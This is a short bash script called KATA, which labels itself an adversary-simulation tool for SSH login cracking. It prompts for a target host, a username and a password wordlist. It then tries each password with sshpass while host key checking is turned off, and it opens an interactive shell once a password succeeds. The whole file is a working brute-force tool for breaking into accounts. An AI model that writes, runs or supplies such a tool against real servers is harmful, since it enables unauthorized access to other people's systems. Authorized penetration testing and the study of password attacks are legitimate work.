#!/bin/bash

# Check if SSH and sshpass are installed
if ! command -v ssh &> /dev/null; then
    echo "SSH is not installed. Please install it and try again."
    exit 1
fi

if ! command -v sshpass &> /dev/null; then
    echo "sshpass is not installed. Please install it and try again."
    exit 1
fi

# Tool title and description
echo "---------------------------------------"
echo "KK    KK   AA   TTTTTT  AA"
echo "KK  KK   AA AA    TT   AA AA"
echo "KKKK    AA   AA   TT  AA   AA"
echo "KK  KK  AAAAAAA   TT  AAAAAAA"
echo "KK    KK AA   AA   TT  AA   AA"
echo "---------------------------------------"
echo
echo "KATA is a terminal-based tool written in bash"
echo "designed to perform adversary simulations"
echo "Its current function is SSH login cracking"
echo

# Function to attempt connection using a password wordlist
attempt_connection_wordlist() {
    read -p "Enter the server IP address or hostname: " HOST
    read -p "Enter the username: " USER
    read -p "Enter the path to the wordlist: " wordlist_path
    if [[ ! -f $wordlist_path ]]; then
        echo "Wordlist file not found. Exiting."
        exit 1
    fi

    while IFS= read -r PASSWORD; do
        echo "Attempting connection with password: $PASSWORD"
        sshpass -p "$PASSWORD" ssh -tt -o StrictHostKeyChecking=no $USER@$HOST exit
        if [ $? -eq 0 ]; then
            echo "Connection successful with password: $PASSWORD"
            sshpass -p "$PASSWORD" ssh -tt -o StrictHostKeyChecking=no $USER@$HOST
            return 0
        fi
    done < "$wordlist_path"

    echo "Connection failed with all passwords in the wordlist."
    return 1
}

# Choice menu
attempt_connection_wordlist
